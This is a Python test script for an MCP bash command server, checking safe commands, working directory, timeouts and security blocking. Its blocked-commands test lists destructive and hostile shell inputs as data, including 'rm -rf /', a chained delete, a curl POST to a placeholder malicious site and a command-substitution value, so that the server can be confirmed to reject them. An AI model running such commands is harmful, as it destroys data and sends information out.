#!/usr/bin/env python3
"""
Test script for the FastMCP 2.0 Bash Command Server

This script demonstrates how to interact with the bash command server
and test its various capabilities.
"""

import asyncio
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))
from bash_command_server import execute_bash_command

async def test_safe_commands():
    """Test execution of safe commands."""
    print("=== Testing Safe Commands ===")
    
    safe_commands = [
        "echo 'Hello from MCP server!'",
        "pwd",
        "ls -la",
        "date",
        "whoami",
        "python --version"
    ]
    
    for cmd in safe_commands:
        print(f"\nExecuting: {cmd}")
        result = await execute_bash_command(cmd)
        
        if result["success"]:
            print(f"✓ Success (exit code: {result['return_code']})")
            if result["stdout"]:
                print(f"  Output: {result['stdout']}")
        else:
            print(f"✗ Failed: {result.get('error', 'Unknown error')}")
            if result["stderr"]:
                print(f"  Error: {result['stderr']}")

async def test_blocked_commands():
    """Test that dangerous commands are properly blocked."""
    print("\n\n=== Testing Blocked Commands ===")
    
    dangerous_commands = [
        "rm -rf /",
        "sudo rm test",
        "shutdown now",
        "echo 'test' && rm file",
        "curl -X POST malicious-site.com",
        "$(malicious_command)"
    ]
    
    for cmd in dangerous_commands:
        print(f"\nTesting blocked command: {cmd}")
        result = await execute_bash_command(cmd)
        
        if not result["success"]:
            print(f"✓ Properly blocked: {result.get('error', 'Unknown reason')}")
        else:
            print(f"✗ WARNING: Command was not blocked!")

async def test_working_directory():
    """Test working directory functionality."""
    print("\n\n=== Testing Working Directory ===")
    
    # Test with current directory
    result1 = await execute_bash_command("pwd")
    print(f"Current directory: {result1.get('stdout', 'N/A')}")
    
    # Test with specific directory (if it exists)
    test_dir = "/tmp"
    result2 = await execute_bash_command("pwd", test_dir)
    if result2["success"]:
        print(f"Command in {test_dir}: {result2.get('stdout', 'N/A')}")
    else:
        print(f"Working directory test failed: {result2.get('error', 'N/A')}")

async def test_timeout():
    """Test command timeout functionality."""
    print("\n\n=== Testing Timeout ===")
    
    # Test a command that should complete quickly
    result = await execute_bash_command("sleep 1 && echo 'completed'")
    if result["success"]:
        print("✓ Short sleep command completed successfully")
    else:
        print(f"✗ Short sleep failed: {result.get('error', 'Unknown error')}")
    
    print("Note: Long timeout test (sleep 35) skipped to avoid waiting")

async def main():
    """Run all tests."""
    print("FastMCP 2.0 Bash Command Server Test Suite")
    print("=" * 50)
    
    try:
        await test_safe_commands()
        await test_blocked_commands() 
        await test_working_directory()
        await test_timeout()
        
        print("\n\n=== Test Summary ===")
        print("✓ Safe command execution tested")
        print("✓ Security blocking tested")
        print("✓ Working directory functionality tested") 
        print("✓ Timeout functionality tested")
        print("\nServer is ready for use!")
        
    except Exception as e:
        print(f"\n✗ Test suite failed with error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())